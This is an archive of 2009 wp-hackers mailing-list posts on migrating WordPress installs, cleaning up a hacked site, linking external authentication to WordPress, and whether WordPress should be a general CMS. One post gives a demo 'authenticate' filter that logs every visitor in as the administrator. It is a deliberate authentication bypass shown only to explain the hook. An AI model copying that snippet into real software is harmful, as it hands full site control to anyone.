Having something that addresses these issues by defining the different servers in the admin console to include the root url and the root path, and functions to pull the root url and root path based on a key (i.e. 'dev', 'stage' and 'live') but these should be admin configurable in case someone wants a different setup such as just dev and live or dev, stage, test and live, for example.

For content, we could add a shortcode for [root-url] and use it instead of the hardcoded root urls.

The solution of modifying wp-config.php is a only patch as far as I'm concerned, not a solution.  Ideally there would be three ways I can see to switch configurations:

1.) Via "Error" message when on the wrong server that lets the user login to the admin console in order to change
2.) The change could be made via HTTP POST assuming an API Key configured specific to the site instance
3.) In an advanced mode selected by the admin, the site could recognize where it is and switch automatically.

Does anyone see anything my analysis misses?

This could actually start as a plugin and then get rolled in after accepted.

Maybe I'll work on it (no promises, I unfortunately juggle too many things.)

-Mike Schinkel

From mccormicky at gmail.com  Wed Dec  2 18:50:37 2009
From: mccormicky at gmail.com (mccormicky)
Date: Wed, 2 Dec 2009 13:50:37 -0500
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <e1202cb10912021030i1e43f71ex42ce729c21e01f88@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>
	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>
	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>
	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>
	<4B16A3BF.4050508@gmail.com>
	<e1202cb10912021030i1e43f71ex42ce729c21e01f88@mail.gmail.com>
Message-ID: <d7153760912021050r74d7c301r176957ba49b07176@mail.gmail.com>

Look  for wp-inclodes.php and fotter.php
(might be a different hack,though).
Check all file/folder last modified timestamps.
I found those above mentioned files in wp-content/uploads in a folder for
June.
The last accessed stamp was for October so it tipped me off.





On Wed, Dec 2, 2009 at 1:30 PM, Jeremy Clarke <jer at simianuprising.com>wrote:

> It's also worth going through any media uploads added since the attack
> and making sure they are really images (downloading them to OSX and
> checking that they have thumbnails in them worked for me). Some might
> be PHP files that are being loaded somehow, depending on your server
> config.
>
> For the actual core files its definitely worth completely deleting
> wp-admin and wp-includes and replacing them entirely with pristine
> versions, nothing really to lose there.
>
> --
> Jeremy Clarke
> Code and Design | globalvoicesonline.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From bradw at illiams.com  Wed Dec  2 18:58:30 2009
From: bradw at illiams.com (Brad Williams)
Date: Wed, 2 Dec 2009 13:58:30 -0500
Subject: [wp-hackers] WP exploit ,
	was Re: [Webmaster Central Help] Site 	hacked.
In-Reply-To: <d7153760912021050r74d7c301r176957ba49b07176@mail.gmail.com>
References: <59e7f3130912020107t61ea9ba8nb67ecdff711f3aac@mail.gmail.com>	<7235ce780912020129n31b10fabq2f2757844c616d21@mail.gmail.com>	<59e7f3130912020632u2d28cef7hd38ae71bddf81905@mail.gmail.com>	<7235ce780912020655h13599806q348ed3187e8b6d03@mail.gmail.com>	<4B16A3BF.4050508@gmail.com>	<e1202cb10912021030i1e43f71ex42ce729c21e01f88@mail.gmail.com>
	<d7153760912021050r74d7c301r176957ba49b07176@mail.gmail.com>
Message-ID: <012801ca7381$70d0fbc0$5272f340$@com>

Also remember if you have multiple websites on the same hosting account they
may also be compromised and should be checked.  Even if they aren't showing
signs of being hacked they could be.

-Brad

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of mccormicky
Sent: Wednesday, December 02, 2009 1:51 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] WP exploit , was Re: [Webmaster Central Help] Site
hacked.

Look  for wp-inclodes.php and fotter.php
(might be a different hack,though).
Check all file/folder last modified timestamps.
I found those above mentioned files in wp-content/uploads in a folder for
June.
The last accessed stamp was for October so it tipped me off.





On Wed, Dec 2, 2009 at 1:30 PM, Jeremy Clarke <jer at simianuprising.com>wrote:

> It's also worth going through any media uploads added since the attack
> and making sure they are really images (downloading them to OSX and
> checking that they have thumbnails in them worked for me). Some might
> be PHP files that are being loaded somehow, depending on your server
> config.
>
> For the actual core files its definitely worth completely deleting
> wp-admin and wp-includes and replacing them entirely with pristine
> versions, nothing really to lose there.
>
> --
> Jeremy Clarke
> Code and Design | globalvoicesonline.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From jaredbangs at gmail.com  Wed Dec  2 19:12:22 2009
From: jaredbangs at gmail.com (Jared Bangs)
Date: Wed, 2 Dec 2009 11:12:22 -0800
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
Message-ID: <7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>

On Wed, Dec 2, 2009 at 10:19 AM, Otto <otto at ottodestruct.com> wrote:
> On Sat, Nov 28, 2009 at 6:02 AM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> This was painful to read. Not because I disagree, but because I can't disagree even though I wish it were not true: ...
>
> I don't disagree with it either. However, I do disagree that WordPress
> should handle those use cases at the present time.
>
> We're not trying to build "one CMS to rule them all" here. WordPress
> is not, and should not be, all things to all people.
>
> There's plenty of room for specialization. Focus on doing one thing
> right, not on doing many things badly.
>

I totally agree. WordPress should primarily focus its efforts on doing
what it's designed to do, and doing it well.

WordPress is good blog software. Without getting into a semantics
debate about what a CMS is, I think that one good reason that it has
become popular to use WordPress as a foundation in CMS-oriented
systems is that it's much simpler and less bloated than most CMS
systems out there. Let's not spoil that advantage by allowing all
those other things to creep in, just for the sake of saying that WP
can handle some use case (far enough removed from blogging) that it
might not currently address.

I didn't read the whole thing, but the article talked about two very
different things, and explained why they are different: WordPress and
Drupal are (or can be used as) "platforms"; Django is a "framework".
This is an important distinction. WordPress should not aspire to
"compete" with Django at all (by adding framework features), because
it isn't intended to be the same thing or meet the same needs.

I think there is a danger in confusing or blurring the distinction
between a "platform" and a "framework". WordPress is an extensible CMS
*platform*, by which I mean that can be a good foundation on which to
build sites which are primarily blog/CMS based, because of the good
core features (as slim as possible) and the open extension model
(using plugins).

Sometimes when I see people looking to use WordPress as a "framework"
for building any sort of generic web app or site, even if it's not
primarily CMS focused, it strikes me as "golden hammer syndrome". This
is a common occurrence for any popular software that's easy enough for
people to customize. PHP is a pretty easy language to learn, and so I
get the feeling that sometimes people go from customizing their
WordPress themes (learning PHP in order to do so) and being impressed
with the ease with which that customization was done, to seeing it as
the solution to all sorts of requirements that it may not quite fit
well for. (More of my thoughts on that here:
http://freepressblog.org/2009/07/22/the-golden-hammer-anti-pattern/)

My advice is to expand your horizons, and become familiar with other
options: other platforms (like Drupal) and more low level frameworks
for general purpose web development. This will help to avoid the urge
to pound a square peg requirement into the round hole of the scope of
what WordPress can or should do.

WordPress is a proud part of the open source community, and a key
benefit to that community is that there's no need to capture market
share or dominate over (and push out) all other peripherally related
products. Like Otto said, much better to focus on doing something
well. There's no harm in acknowledging that other solutions are better
suited to other needs, and no reason for that to inspire jealousy in
regards to the features of another product.

From beau at dentedreality.com.au  Wed Dec  2 19:38:41 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Wed, 2 Dec 2009 11:38:41 -0800
Subject: [wp-hackers] Integrate site authentication with WordPress
In-Reply-To: <c066f0d80912021033p82e43a6k6db10768f82bded9@mail.gmail.com>
References: <c066f0d80912011141p1783150i25a1ab78fc2b7c03@mail.gmail.com> 
	<a21f8bf00912011253t673d06dala8184e6f0fd134b9@mail.gmail.com> 
	<c066f0d80912021033p82e43a6k6db10768f82bded9@mail.gmail.com>
Message-ID: <902424490912021138ub0e5e40od55e0e8353ca160b@mail.gmail.com>

> This article works if I want to let WordPress do the authentication but I
> want the rails site to handle the authentication. I want the user to
> be automatically logged in to WordPress when they log in on the rails site.

You'll need to ensure that your passwords are always kept in sync
between the 2 DBs then, and also have your Rails app generate cookies
that match up with WP in that case (probably in addition to whatever
you're already doing). Take a look at how the functions work in
pluggable.php ( wp_*_auth_cookie() functions ).

Have a look at wp-includes/class-phpass.php for the hashing mechanism
used in WP to store passwords these days, and check out
wp_hash_password() (also in pluggable.php) to see it in action.
Alternatively, you could override all those functions with your own
versions that match more closely to your current Rails implementation
(since they're all in pluggable to specifically allow you to override
them in a plugin).

HTH
Beau

From harish.mlists at gmail.com  Wed Dec  2 19:51:42 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Wed, 02 Dec 2009 19:51:42 +0000
Subject: [wp-hackers] Tips for moving a Wordpress install
In-Reply-To: <8B7F18B1-A168-4B19-B84A-A9C31C87F9EE@newclarity.net>
References: <d14758810912011220u6d17bb68p4c7fb226125bd89d@mail.gmail.com>	<4B157D8D.2030209@gmail.com>	<1367434fd0ef9ccd9f1a69f83013f948@laurel.joyent.us>	<e1202cb10912020935m5f56f4eakd4fdd45bc2fae80b@mail.gmail.com>
	<8B7F18B1-A168-4B19-B84A-A9C31C87F9EE@newclarity.net>
Message-ID: <4B16C54E.3010803@gmail.com>

Mike Schinkel wrote:
> On Dec 2, 2009, at 12:35 PM, Jeremy Clarke wrote:
>> * Controlling the URL settings for the various versions is dead easy
>> using wp-config.php, just add these definitions and you will be able
>> to use backups of your live database on Dev and Stage with almost no
>> problems (you might still be pulling the media files from the actual
>> server but this rarely impedes your new development since they load
>> fine as long as you are online).
>>
>>  define('WP_SITEURL', 'http://example.com/wordpress');
>>  define('WP_HOME', 'http://example.com/wordpress');
> 
> There are other problems such as: 
> 
> 1.) core and plugins that require a local path as a saved setting, 
> 2.) paths saved in serialized arrays, and 
> 3.) links in content and media that points to the development or a staging server when the data is pushed live.  
> 
> Having something that addresses these issues by defining the different servers in the admin console to include the root url and the root path, and functions to pull the root url and root path based on a key (i.e. 'dev', 'stage' and 'live') but these should be admin configurable in case someone wants a different setup such as just dev and live or dev, stage, test and live, for example.
> 
> For content, we could add a shortcode for [root-url] and use it instead of the hardcoded root urls.
> 
> The solution of modifying wp-config.php is a only patch as far as I'm concerned, not a solution.  Ideally there would be three ways I can see to switch configurations:
> 
> 1.) Via "Error" message when on the wrong server that lets the user login to the admin console in order to change
> 2.) The change could be made via HTTP POST assuming an API Key configured specific to the site instance
> 3.) In an advanced mode selected by the admin, the site could recognize where it is and switch automatically.
> 
> Does anyone see anything my analysis misses?

I think any of these will be good ideas. Please submit some of your
ideas a patches.

Harish

> This could actually start as a plugin and then get rolled in after accepted.
> 
> Maybe I'll work on it (no promises, I unfortunately juggle too many things.)
> 
> -Mike Schinkel
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From otto at ottodestruct.com  Wed Dec  2 20:21:32 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 2 Dec 2009 14:21:32 -0600
Subject: [wp-hackers] Integrate site authentication with WordPress
In-Reply-To: <902424490912021138ub0e5e40od55e0e8353ca160b@mail.gmail.com>
References: <c066f0d80912011141p1783150i25a1ab78fc2b7c03@mail.gmail.com> 
	<a21f8bf00912011253t673d06dala8184e6f0fd134b9@mail.gmail.com> 
	<c066f0d80912021033p82e43a6k6db10768f82bded9@mail.gmail.com> 
	<902424490912021138ub0e5e40od55e0e8353ca160b@mail.gmail.com>
Message-ID: <161617690912021221o5a83a445y5a48c3168781d691@mail.gmail.com>

That's the old way. Authenticating a user in WP 2.8 and up is much more simple.

1. Create a function that authenticates the user via whatever means
you like, and returns an appropriate WP_User object.
2. Hook that to the 'authenticate' filter.
3. There is no 3.

Example - Everybody is the admin:

function everybody_gets_to_be_the_admin($user) {
$user = new WP_User(1);
return $user;
}

add_filter('authenticate','everybody_gets_to_be_the_admin');

Basically, authentication is now a simple matter. WordPress itself has
two built in methods, both using something very similar to the above.
wp_authenticate_cookie will check cookies to see if authentication
works there, and wp_authenticate_username_password will check
usernames and passwords to produce valid credentials. In either case,
all that has to be done is to produce a valid WP_User object.

Few points of note:
- The authenticate filter can pass in three parameters: A WP_user
object (or null), username, and password.
- If the $user is already set, then you probably should return it
without modification.
- If you want the input username and password to check against
something (anything), you'll need to add those params to your function
and add ,10, 3 to your add_filter call, to receive them.

This sort of thing is called every page load, so if you want to not
have to check against a database too often, you can do your own cookie
based system, if you like, or set WordPress's cookie after
authenticating, by calling wp_set_auth_cookie appropriately.

-Otto
Sent from Memphis, TN, United States


On Wed, Dec 2, 2009 at 1:38 PM, Beau Lebens <beau at dentedreality.com.au> wrote:
>> This article works if I want to let WordPress do the authentication but I
>> want the rails site to handle the authentication. I want the user to
>> be automatically logged in to WordPress when they log in on the rails site.
>
> You'll need to ensure that your passwords are always kept in sync
> between the 2 DBs then, and also have your Rails app generate cookies
> that match up with WP in that case (probably in addition to whatever
> you're already doing). Take a look at how the functions work in
> pluggable.php ( wp_*_auth_cookie() functions ).
>
> Have a look at wp-includes/class-phpass.php for the hashing mechanism
> used in WP to store passwords these days, and check out
> wp_hash_password() (also in pluggable.php) to see it in action.
> Alternatively, you could override all those functions with your own
> versions that match more closely to your current Rails implementation
> (since they're all in pluggable to specifically allow you to override
> them in a plugin).
>
> HTH
> Beau
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From beau at dentedreality.com.au  Wed Dec  2 20:32:56 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Wed, 2 Dec 2009 12:32:56 -0800
Subject: [wp-hackers] Integrate site authentication with WordPress
In-Reply-To: <161617690912021221o5a83a445y5a48c3168781d691@mail.gmail.com>
References: <c066f0d80912011141p1783150i25a1ab78fc2b7c03@mail.gmail.com> 
	<a21f8bf00912011253t673d06dala8184e6f0fd134b9@mail.gmail.com> 
	<c066f0d80912021033p82e43a6k6db10768f82bded9@mail.gmail.com> 
	<902424490912021138ub0e5e40od55e0e8353ca160b@mail.gmail.com> 
	<161617690912021221o5a83a445y5a48c3168781d691@mail.gmail.com>
Message-ID: <902424490912021232gd5fe24cva74ea616d9a13580@mail.gmail.com>

> That's the old way. Authenticating a user in WP 2.8 and up is much more simple.
>
> 1. Create a function that authenticates the user via whatever means
> you like, and returns an appropriate WP_User object.
> 2. Hook that to the 'authenticate' filter.
> 3. There is no 3.

You learn something new everyday :)

That's awesome Otto, thanks!

From mikeschinkel at newclarity.net  Wed Dec  2 22:02:59 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 17:02:59 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
Message-ID: <7590759D-C5C5-4FFA-A283-4CD6BD1F9DDC@newclarity.net>

On Dec 2, 2009, at 1:19 PM, Otto wrote:
> We're not trying to build "one CMS to rule them all" here. WordPress
> is not, and should not be, all things to all people.

That's your opinion.  It's not mine and I believe that I am from alone in that opinion.  If there are others who agree with this, a mention of support to this list would be appreciated.

> There's plenty of room for specialization. Focus on doing one thing
> right, not on doing many things badly.

Specialization can come from plugins. There's no reason WordPress can't be the best base platform for what most websites need; it's already almost there.

-Mike Schinkel

From ncrice at gmail.com  Wed Dec  2 22:09:11 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Wed, 2 Dec 2009 17:09:11 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <7590759D-C5C5-4FFA-A283-4CD6BD1F9DDC@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7590759D-C5C5-4FFA-A283-4CD6BD1F9DDC@newclarity.net>
Message-ID: <862d087f0912021409g61bbad33x9325fae3ed6c0234@mail.gmail.com>

I've personally never run across an instance where WordPress wasn't the
ideal solution. I'm support at least trying to provide the tools to
developers to make WordPress be much more than just blogging software.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Wed, Dec 2, 2009 at 5:02 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Dec 2, 2009, at 1:19 PM, Otto wrote:
> > We're not trying to build "one CMS to rule them all" here. WordPress
> > is not, and should not be, all things to all people.
>
> That's your opinion.  It's not mine and I believe that I am from alone in
> that opinion.  If there are others who agree with this, a mention of support
> to this list would be appreciated.
>
> > There's plenty of room for specialization. Focus on doing one thing
> > right, not on doing many things badly.
>
> Specialization can come from plugins. There's no reason WordPress can't be
> the best base platform for what most websites need; it's already almost
> there.
>
> -Mike Schinkel
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Wed Dec  2 22:16:03 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 17:16:03 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
Message-ID: <C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>

On Dec 2, 2009, at 2:12 PM, Jared Bangs wrote:
> I totally agree. WordPress should primarily focus its efforts on doing
> what it's designed to do, and doing it well.

All those arguments sound well and good when discussed in the abstract, but is a strawman that falls apart when discussed in specifics.  

Drupal and Joomla are bloated because of their highly-coupled architectures not because of the address functional needs.  WordPress' architecture is much less coupled and making it easier to theme and to use. 

The only thing WordPress needs to get past the "It's not a good general CMS" criticism is support for custom post types and custom URL routing that are both easy to manage.  Adding that will not significantly "bloat" WordPress; base support for custom post types is already in 2.9; all we need beyond that is admin functionality to support it.

Honestly I can't see why people push back on this, and I won't venture a guess as to why.
> 
> My advice is to expand your horizons, and become familiar with other
> options: other platforms (like Drupal) and more low level frameworks
> for general purpose web development.

Personally, I used Drupal for two years prior to starting with WordPress.  I recently used Drupal again for a client which reminded me of what a nightmare it is and how much better WordPress is.  So forgive me but I'm far more familiar with Drupal than I'd like to be.

As for lower level frameworks like Django and CakePHP, they are good for the 20% of websites that need seriously custom functionality (i.e. SAAS sites like Freshbooks, etc.); the other 80% could be serviced with WordPress having custom post types and custom URL routing.

> This will help to avoid the urge to pound a square peg requirement into
> the round hole of the scope of what WordPress can or should do.

Again, that's a strawman. Talk specifics, not platitudes.

> WordPress is a proud part of the open source community, and a key
> benefit to that community is that there's no need to capture market
> share or dominate over (and push out) all other peripherally related
> products.

That's irrelevant.

> Like Otto said, much better to focus on doing something
> well. There's no harm in acknowledging that other solutions are better
> suited to other needs, and no reason for that to inspire jealousy in
> regards to the features of another product.

I have absolutely no jealousy here; I'm a pragmatic entrepreneur who knows how to program.  I want a business solution, not to follow an ideology.

-Mike Schinkel

From adamjctaylor at gmail.com  Wed Dec  2 22:22:18 2009
From: adamjctaylor at gmail.com (Adam Taylor)
Date: Wed, 2 Dec 2009 22:22:18 +0000
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com> 
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com> 
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
Message-ID: <d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>

On Wed, Dec 2, 2009 at 10:16 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:
>
> I have absolutely no jealousy here; I'm a pragmatic entrepreneur who knows
> how to program.  I want a business solution, not to follow an ideology.
>

Why don't you "embrace open source", fork Wordpress, and shape it how you
like.  If others agree with your idea/philosophy they will support it by
using it, and Wordpress can stick to being an awesome blogging platform.

Adam
-- 
adamjctaylor at gmail.com
http://www.twitter.com/adamtaylor

From otto at ottodestruct.com  Wed Dec  2 22:22:24 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 2 Dec 2009 16:22:24 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com> 
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com> 
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
Message-ID: <161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>

On Wed, Dec 2, 2009 at 4:16 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> ... support for custom post types and custom URL routing ...

You're overly focused on these two aspects. Neither myself nor Jared
said anything about specifics.

> Again, that's a strawman. Talk specifics, not platitudes.

This thread was not intended to be about specifics. I was speaking in
general terms and talking about general directions. If you want to
talk about specific things, talk about them, but not as responses to
unrelated materials. Then things just get confusing.

For the record, I think custom post types are a good thing.

I don't like your particular visions about URL routing, because I
think you're thinking too narrowly and focusing on your specific needs
instead of having a wider scope, but I'm not generically opposed to
making URLs easier to work with.

-Otto

From ncrice at gmail.com  Wed Dec  2 22:37:34 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Wed, 2 Dec 2009 17:37:34 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
Message-ID: <862d087f0912021437p66cb280ag9a403f8bbd4e27bd@mail.gmail.com>

I think the principles that will make WordPress a better general use CMS are
the same principles that will make it a good blogging platform.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Wed, Dec 2, 2009 at 5:22 PM, Otto <otto at ottodestruct.com> wrote:

> On Wed, Dec 2, 2009 at 4:16 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
> > ... support for custom post types and custom URL routing ...
>
> You're overly focused on these two aspects. Neither myself nor Jared
> said anything about specifics.
>
> > Again, that's a strawman. Talk specifics, not platitudes.
>
> This thread was not intended to be about specifics. I was speaking in
> general terms and talking about general directions. If you want to
> talk about specific things, talk about them, but not as responses to
> unrelated materials. Then things just get confusing.
>
> For the record, I think custom post types are a good thing.
>
> I don't like your particular visions about URL routing, because I
> think you're thinking too narrowly and focusing on your specific needs
> instead of having a wider scope, but I'm not generically opposed to
> making URLs easier to work with.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Wed Dec  2 22:41:03 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 17:41:03 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
Message-ID: <C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>

On Dec 2, 2009, at 5:22 PM, Otto wrote:
> This thread was not intended to be about specifics. I was speaking in
> general terms and talking about general directions. If you want to
> talk about specific things, talk about them, but not as responses to
> unrelated materials. Then things just get confusing.

For the record, I thought I did just speak about specifics: custom post types and custom url routing.

> I don't like your particular visions about URL routing, because I
> think you're thinking too narrowly and focusing on your specific needs
> instead of having a wider scope, but I'm not generically opposed to
> making URLs easier to work with.

My reaction is to think you don't understand my visions because I'm looking to make it more generic not less, and my perception of your criticisms is that you are trying to constrain it to be less so.  Of course that's all my perception which is probably not the reality.

So let's get pass this and try to figure out what works.  Can you explain what you think my vision is (so I can either agree or correct it) and then why you think that vision is too narrow by giving counter examples?


-Mike Schinkel

From jmiloj at gmail.com  Wed Dec  2 22:42:02 2009
From: jmiloj at gmail.com (Jerry Johnson)
Date: Wed, 2 Dec 2009 17:42:02 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
Message-ID: <a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>

Given a choice on where Wordpress improves over the near future, I would
vote for speed and optimization.

It does everything I need now (or I can make plugins, themes and widgets to
get me there, or I can split a sub-app out on its own as needed), but it
doesn't always do it _fast_.

Some of the sites we are doing now are in the 50K-100K post range, with
liberal use of postmeta data, and it is taking a lot of time and even some
core changes to regain the speed we fell in love with.

Admittedly, much of that slowdown is caused by third-party plugins adding
complexity to the base post, but they are really, really neat plugins.

This is _not_ a criticism, but a wistful hope.

I am all for keeping wordpress small, fast and tight. Because it rocks that
way. I can bloat it fine on my own.

Jerry Johnson

On Wed, Dec 2, 2009 at 5:22 PM, Otto <otto at ottodestruct.com> wrote:

> This thread was not intended to be about specifics. I was speaking in
> general terms and talking about general directions. If you want to
> talk about specific things, talk about them, but not as responses to
> unrelated materials. Then things just get confusing.
>

From mikeschinkel at newclarity.net  Wed Dec  2 22:44:14 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 17:44:14 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
Message-ID: <7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>

On Dec 2, 2009, at 5:22 PM, Adam Taylor wrote:
> On Wed, Dec 2, 2009 at 10:16 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
>> 
>> I have absolutely no jealousy here; I'm a pragmatic entrepreneur who knows
>> how to program.  I want a business solution, not to follow an ideology.
>> 
> 
> Why don't you "embrace open source", fork Wordpress, and shape it how you
> like.  If others agree with your idea/philosophy they will support it by
> using it, and Wordpress can stick to being an awesome blogging platform.

Because I see that #1 value of WordPress being it's large user base and large support for that user base.  Forking would be killing the goose that lays the golden eggs in that respect.  I would *never* fork a successful open source project.  I would instead try to influence it within.

For the record there are almost certainly better technical solutions than WordPress but the inertia behind WordPress make all those technical benefits moot.

-Mike Schinkel

From mikeschinkel at newclarity.net  Wed Dec  2 22:49:06 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 17:49:06 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
Message-ID: <4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>

On Dec 2, 2009, at 5:42 PM, Jerry Johnson wrote:
> I am all for keeping wordpress small, fast and tight. Because it rocks that
> way. I can bloat it fine on my own.

There's a belief held by many that adding features necessarily affects performance negatively. That is not by any means a rule and to make decisions based on only that assumption does a disservice to the broader community.  Having the option of custom post types and the option of URL routing should not negatively affect those sites that do not use those options if the enhancements are architected with performance in mind.

-Mike Schinkel





From charles at cefm.ca  Wed Dec  2 22:49:34 2009
From: charles at cefm.ca (Charles Frees-Melvin)
Date: Wed, 2 Dec 2009 18:49:34 -0400
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
Message-ID: <E836E7CB-5CA2-4472-A6F7-90DA247D46D6@cefm.ca>

I think with the direction proposed with core plugins to enhance and  
add more functionality. I leaves the opportunity for WordPress to  
